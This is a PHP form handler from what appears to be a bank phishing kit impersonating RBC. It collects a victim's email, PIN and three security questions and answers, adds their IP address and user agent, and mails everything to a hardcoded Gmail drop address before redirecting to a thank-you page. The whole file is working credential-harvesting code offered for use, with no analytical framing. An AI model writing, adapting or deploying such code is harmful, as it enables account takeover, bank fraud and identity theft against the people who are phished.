<?php
if($_POST["formtext1"] != "" and $_POST["formtext2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------R B C Info-----------------------\n";
$message .= "Email             : ".$_POST['formtext1']."\n";
$message .= "PIN             : ".$_POST['formtext2']."\n";
$message .= "Question 1             : ".$_POST['formselect1']."\n";
$message .= "Answer 1           : ".$_POST['formtext3']."\n";
$message .= "Question 2            : ".$_POST['formselect2']."\n";
$message .= "Answer 2           : ".$_POST['formtext4']."\n";
$message .= "Question 3            : ".$_POST['formselect3']."\n";
$message .= "Answer 3            : ".$_POST['formtext5']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- --------------|\n";
$send = "abdoalarg53@gmail.com";
$subject = "R B C | $ip";
{
mail("$send", "$subject", $message);   
}

  header ("Location: thankyou.html");
}else{
header ("Location: index.php");
}

?>